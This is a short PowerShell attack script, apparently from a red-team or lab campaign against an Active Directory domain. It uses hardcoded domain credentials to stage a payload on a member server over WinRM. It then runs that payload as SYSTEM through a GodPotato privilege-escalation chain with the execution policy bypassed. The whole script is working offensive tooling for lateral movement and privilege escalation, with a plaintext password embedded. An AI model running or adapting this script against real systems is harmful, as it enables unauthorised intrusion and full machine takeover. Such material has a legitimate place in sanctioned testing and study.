[CmdletBinding()]
param(
    [string]$Server = "192.168.77.22",
    [string]$Username = "analyst_t1",
    [string]$Password = "T13r_An@lyst!",
    [string]$GpPath = "C:\Windows\Temp\cadre-tools\GodPotato.exe",
    [string]$Payload = "C:\Windows\Temp\cadre-tools\campaign-a-t102-dc02-tgt-payload.ps1"
)
$ErrorActionPreference = "Stop"

# Stage payload to mbr01 over WinRM
$cred = New-Object System.Management.Automation.PSCredential("child.cadre.local\$Username", (ConvertTo-SecureString $Password -AsPlainText -Force))
$session = New-PSSession -ComputerName "mbr01.child.cadre.local" -Credential $cred
Copy-Item -Path "$PSScriptRoot\campaign-a-t102-dc02-tgt-payload.ps1" -Destination $Payload -ToSession $session -Force
Remove-PSSession $session
Write-Output "T102_PAYLOAD_STAGED"

# Run as SYSTEM via GodPotato chain
& "$PSScriptRoot\campaign-a-t043-system-exec.ps1" -Server $Server -Username $Username -Password $Password -GpPath $GpPath -ScriptBlock "powershell -NoProfile -ExecutionPolicy Bypass -File $Payload"
